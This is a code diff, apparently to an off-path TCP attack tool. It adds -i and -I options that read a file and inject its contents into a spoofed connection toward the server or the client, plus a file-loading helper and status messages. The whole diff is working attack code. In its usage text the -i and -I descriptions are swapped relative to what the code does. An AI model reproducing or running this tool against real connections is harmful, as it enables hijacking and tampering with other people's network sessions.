@@ -42,6 +42,11 @@
 /* threading */
 #include <pthread.h>
 
+/* filesystem interaction */
+#include <sys/stat.h>
+#include <fcntl.h>
+
+
 #ifndef ROUTER_MAC
 #define ROUTER_MAC "\x01\x02\x03\x04\x05\x06"
 #endif
@@ -106,6 +111,10 @@ typedef struct thctx_struct {
 	u_long packets_per_second;
 	u_long packet_delay;
 	u_long start_seq;
+	char *inject_server;
+	off_t inject_server_len;
+	char *inject_client;
+	off_t inject_client_len;
 } thctx_t;
 
 /* for probing groups of values, limited by PACKETS_PER_SECOND */
@@ -144,6 +153,8 @@ int lookup_host(char *hostname, struct sockaddr_in *addr);
 int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv,
 		uint16_t lport, int *off2ip);
 
+char *slurp(char *file, off_t *plen);
+
 
 void usage(char *argv0)
 {
@@ -153,7 +164,8 @@ void usage(char *argv0)
 			"-a             automatically start the attack\n"
 			"-d <usec>      packet delay\n"
 			"-h             this help, duh.\n"
-			// inject or reset?
+			"-i <file>      inject data from file to the server\n"
+			"-I <file>      inject data from file to the client\n"
 			"-p <port>      spoofed client port\n"
 			// if it differs from legit connection port
 			"-P <port>      alternate server port (advanced)\n"
@@ -176,6 +188,7 @@ int main(int argc, char *argv[])
 	int c, srvport, altport = -1, cliport = -1;
 	char myhost[512];
 	struct sockaddr_in sin;
+	char *srvfn = NULL, *clifn = NULL;
 
 	/* look up this machine's address */
 	if (gethostname(myhost, sizeof(myhost)) == -1) {
@@ -200,7 +213,7 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	while ((c = getopt(argc, argv, "ad:hP:p:r:S:s:A:")) != -1) {
+	while ((c = getopt(argc, argv, "ad:hI:i:P:p:r:S:s:A:")) != -1) {
 		switch (c) {
 			case '?':
 			case 'h':
@@ -221,6 +234,36 @@ int main(int argc, char *argv[])
 						return 1;
 					}
 					g_ctx.packet_delay = tmp;
+				}
+				break;
+
+			case 'I':
+				{
+					off_t len;
+					char *buf = slurp(optarg, &len);
+
+					if (!buf) {
+						fprintf(stderr, "[!] unable to load server inject data from \"%s\"\n", optarg);
+						return 1;
+					}
+					g_ctx.inject_server = buf;
+					g_ctx.inject_server_len = len;
+					srvfn = optarg;
+				}
+				break;
+
+			case 'i':
+				{
+					off_t len;
+					char *buf = slurp(optarg, &len);
+
+					if (!buf) {
+						fprintf(stderr, "[!] unable to load client inject data from \"%s\"\n", optarg);
+						return 1;
+					}
+					g_ctx.inject_client = buf;
+					g_ctx.inject_client_len = len;
+					clifn = optarg;
 				}
 				break;
 
@@ -350,6 +393,12 @@ int main(int argc, char *argv[])
 		printf("    packets per second: %lu\n", g_ctx.packets_per_second);
 	if (g_ctx.packet_delay != PACKET_DELAY)
 		printf("    packet delay: %lu\n", g_ctx.packet_delay);
+	if (srvfn)
+		printf("    attempting to inject %lu bytes to the server from \"%s\"\n",
+				g_ctx.inject_server_len, srvfn);
+	if (clifn)
+		printf("    attempting to inject %lu bytes to the client from \"%s\"\n",
+				g_ctx.inject_client_len, clifn);
 
 	/* here we go.. WOOO */
 	return set_up_attack();
@@ -1767,3 +1816,48 @@ int kbhit(void)
 	return select(fileno(stdin) + 1, &rfds, NULL, NULL, &tv);
 }
 /* thanks again prym */
+
+
+/*
+ * load all the data from the specified file into a heap buffer
+ */
+char *slurp(char *file, off_t *plen)
+{
+	struct stat sb;
+	int fd;
+	char *pbuf;
+	ssize_t nr;
+
+	if (stat(file, &sb) == -1) {
+		perror("[!] stat");
+		return NULL;
+	}
+
+	if (!S_ISREG(sb.st_mode)) {
+		fprintf(stderr, "[!] \"%s\" is not a file.\n", file);
+		return NULL;
+	}
+
+	if (!(pbuf = (char *)malloc(sb.st_size))) {
+		perror("[!] malloc");
+		return NULL;
+	}
+
+	if ((fd = open(file, O_RDONLY)) == -1) {
+		perror("[!] open");
+		free(pbuf);
+		return NULL;
+	}
+
+	nr = read(fd, pbuf, sb.st_size);
+	if (nr != sb.st_size) {
+		if (nr < 0)
+			perror("[!] read");
+		else
+			fprintf(stderr, "[!] short read!\n");
+		return NULL;
+	}
+
+	*plen = sb.st_size;
+	return pbuf;
+}
